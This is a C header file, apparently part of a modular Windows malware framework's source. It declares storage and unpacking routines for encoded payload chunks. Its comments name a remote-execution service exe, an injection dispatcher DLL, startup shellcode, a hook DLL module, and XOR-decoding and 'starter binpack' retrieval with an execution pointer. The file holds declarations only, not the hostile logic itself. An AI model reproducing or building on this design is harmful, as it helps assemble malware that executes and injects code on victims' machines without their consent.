/*
	EmbeddedResources.h
*/
#pragma once

#include <windows.h>

// NB: each of these resources is supplied in both (x32/x64) archs, according to ARCH_TYPE requested 
typedef enum RES_TYPE {
	RES_TYPE_RSE = 1,	// remote service exe (initial execution point for remote exec)
	RES_TYPE_IDD,		// install dispatcher dll (injection or process template to start execution)
	RES_TYPE_WDD,		// work dispatcher dll (core)
	RES_TYPE_SHELLCODE,	// binpack's headering shellcode to perform startup 
	RES_TYPE_MODULE,	// generic module, multiple items
	RES_TYPE_KBRI_HD	// KBRI module's hook dll
};

// architecture of remote machine / resource
typedef enum ARCH_TYPE {
	ARCH_TYPE_UNKNOWN = 0,
	ARCH_TYPE_X32,
	ARCH_TYPE_X64
};

// same descriptor as EMBEDDEDRESOURCE, but for a serialized storage (heading binary itself)
#pragma pack(push)
#pragma pack(1)
typedef struct _ER_SERIALIZED_CHUNK_PARAMS
{
	DWORD dwChunkOptions;	// (BYTE)RES_TYPE + (BYTE)ARCH_TYPE + (WORD)MODULE_ID ( (BYTE)ENUM_MODULE_CLASSNAME + (BYTE)CLASS_ID_VALUE )
	DWORD dwChunkLen;	// ^ it's size
	DWORD dwOrigLen;	// original len of chunk, for calculating mem needed for binary pack without actual decoding
	DWORD dwExtra;		// extra param, for shellcode chunk contains relative offset of entrypoint, for all others - module's version
} ER_SERIALIZED_CHUNK_PARAMS, *PER_SERIALIZED_CHUNK_PARAMS;
#pragma pack(pop)

// structure describing a single embedded data chunk with passed options
typedef struct _EMBEDDEDRESOURCE
{
	ER_SERIALIZED_CHUNK_PARAMS opts;	// structure with all options available
	LPVOID pChunk;						// ptr to encoded buffer
} EMBEDDEDRESOURCE, *PEMBEDDEDRESOURCE;


// single chunk pointer by linked list
typedef struct _EMBEDDEDRESOURCE_LIST_CHUNK EMBEDDEDRESOURCE_LIST_CHUNK;
typedef struct _EMBEDDEDRESOURCE_LIST_CHUNK
{
	EMBEDDEDRESOURCE_LIST_CHUNK *lcNext;
	EMBEDDEDRESOURCE er;					// NB: payload in head item is not used

} EMBEDDEDRESOURCE_LIST_CHUNK, *PEMBEDDEDRESOURCE_LIST_CHUNK;

// internals globals structure
typedef struct _ER_WORK_STRUCTURE
{
	BOOL bInited;						// set to TRUE when init was performed
	CRITICAL_SECTION csListAccess;		// cs guarding acces to a list
	EMBEDDEDRESOURCE_LIST_CHUNK lHead;	// list head of emb resources chain
	DWORD dwItemsCount;					// amount of items in ^ chain

} ER_WORK_STRUCTURE, *PER_WORK_STRUCTURE;


// define functions for import-export, used in both compilation modes
typedef struct _EmbeddedResources_ptrs {

	EMBEDDEDRESOURCE *(*fn_erFindChunk)(DWORD dwChunkOptions);
	EMBEDDEDRESOURCE_LIST_CHUNK *(*fn_erEnumFromChunk)(EMBEDDEDRESOURCE_LIST_CHUNK *pItemIn);
	VOID(*fn_erEnterLock)();
	VOID(*fn_erLeaveLock)();

	BOOL(*fnerQueryFile)(RES_TYPE rt, ARCH_TYPE at, LPVOID *pBuff, DWORD *dwLen, DWORD *pdwExtraParam, BOOL bDoFinalDexor);
	BOOL(*fnerUnpackResourceBuffer)(EMBEDDEDRESOURCE *er, LPVOID pInData, DWORD dwInDataLen, LPVOID *pBuff, DWORD *dwLen, DWORD *pdwExtraParam, BOOL bDoFinalDexor);
	DWORD(*fnerGetStarterBinpackLen)(ARCH_TYPE at);
	BOOL(*fnerGetStarterBinpack)(ARCH_TYPE at, LPVOID *pResBuffer, DWORD *dwResBufferLen, LPVOID *pContextPtr, LPVOID *pExecPtr);
	DWORD(*fnerGetClearItemLen)(RES_TYPE rt, ARCH_TYPE at, WORD wModuleId);

	BOOL(*fnerRegisterBinaryChunk)(DWORD dwChunkOptions, LPVOID pChunk, DWORD dwChunkLen, DWORD dwOrigChunkLen, DWORD dwChunkExtra);
	DWORD(*fn_erMakeChunkOptions)(RES_TYPE rt, ARCH_TYPE at, WORD wModuleId);
	VOID(*fn_erGetParamsFromOptions)(DWORD dwChunkOptions, RES_TYPE *rt, ARCH_TYPE *at, WORD *wModuleId);
	VOID(*fnerRegisterModules)(LPVOID pBinpack);

} EmbeddedResources_ptrs, *PEmbeddedResources_ptrs;


#ifdef ROUTINES_BY_PTR

#pragma message(__FILE__": ROUTINES_BY_PTR compilation mode")

// global var definition to be visible by all modules which use this one
extern EmbeddedResources_ptrs EmbeddedResources_apis;

// transparent code replacements
#define _erFindChunk EmbeddedResources_apis.fn_erFindChunk
#define _erEnumFromChunk EmbeddedResources_apis.fn_erEnumFromChunk
#define _erEnterLock EmbeddedResources_apis.fn_erEnterLock
#define _erLeaveLock EmbeddedResources_apis.fn_erLeaveLock

#define erQueryFile EmbeddedResources_apis.fnerQueryFile
#define erUnpackResourceBuffer EmbeddedResources_apis.fnerUnpackResourceBuffer
#define erGetStarterBinpackLen EmbeddedResources_apis.fnerGetStarterBinpackLen
#define erGetStarterBinpack EmbeddedResources_apis.fnerGetStarterBinpack
#define erGetClearItemLen EmbeddedResources_apis.fnerGetClearItemLen

#define erRegisterBinaryChunk EmbeddedResources_apis.fnerRegisterBinaryChunk
#define _erMakeChunkOptions EmbeddedResources_apis.fn_erMakeChunkOptions
#define _erGetParamsFromOptions EmbeddedResources_apis.fn_erGetParamsFromOptions
#define erRegisterModules EmbeddedResources_apis.fnerRegisterModules

VOID EmbeddedResources_resolve(EmbeddedResources_ptrs *apis);

#else


EMBEDDEDRESOURCE *_erFindChunk(DWORD dwChunkOptions);
EMBEDDEDRESOURCE_LIST_CHUNK *_erEnumFromChunk(EMBEDDEDRESOURCE_LIST_CHUNK *pItemIn);
VOID _erEnterLock(); 
VOID _erLeaveLock();

BOOL erQueryFile(RES_TYPE rt, ARCH_TYPE at, LPVOID *pBuff, DWORD *dwLen, DWORD *pdwExtraParam, BOOL bDoFinalDexor);
BOOL erUnpackResourceBuffer(EMBEDDEDRESOURCE *er, LPVOID pInData, DWORD dwInDataLen, LPVOID *pBuff, DWORD *dwLen, DWORD *pdwExtraParam, BOOL bDoFinalDexor);
DWORD erGetStarterBinpackLen(ARCH_TYPE at);
BOOL erGetStarterBinpack(ARCH_TYPE at, LPVOID *pResBuffer, DWORD *dwResBufferLen, LPVOID *pContextPtr, LPVOID *pExecPtr);
DWORD erGetClearItemLen(RES_TYPE rt, ARCH_TYPE at, WORD wModuleId);

BOOL erRegisterBinaryChunk(DWORD dwChunkOptions, LPVOID pChunk, DWORD dwChunkLen, DWORD dwOrigChunkLen, DWORD dwChunkExtra);
DWORD _erMakeChunkOptions(RES_TYPE rt, ARCH_TYPE at, WORD wModuleId);
VOID _erGetParamsFromOptions(DWORD dwChunkOptions, RES_TYPE *rt, ARCH_TYPE *at, WORD *wModuleId);
VOID erRegisterModules(LPVOID pBinpack);

VOID EmbeddedResources_imports(EmbeddedResources_ptrs *apis);

#endif